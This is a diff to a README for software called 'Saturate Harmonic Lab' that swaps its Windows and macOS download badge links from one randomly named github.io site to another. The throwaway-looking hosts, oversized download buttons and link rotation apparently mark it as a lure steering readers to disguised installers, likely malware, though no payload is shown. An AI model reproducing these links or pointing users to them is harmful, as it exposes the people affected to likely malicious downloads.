@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Saturate Harmonic Lab](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_SATURATE_HARMONIC_LAB-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://iggoiiltktso.github.io/win-installer/)
+[![Download Saturate Harmonic Lab](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_SATURATE_HARMONIC_LAB-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mjztsbomuptb.github.io/windows-dl/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Saturate Harmonic Lab** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-E65100?style=for-the-badge&logo=windows&logoColor=white)](https://iggoiiltktso.github.io/win-installer/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-E65100?style=for-the-badge&logo=apple&logoColor=white)](https://iggoiiltktso.github.io/mac-get/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-E65100?style=for-the-badge&logo=windows&logoColor=white)](https://mjztsbomuptb.github.io/windows-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-E65100?style=for-the-badge&logo=apple&logoColor=white)](https://mjztsbomuptb.github.io/macos-dl/)
 
 </div>
 
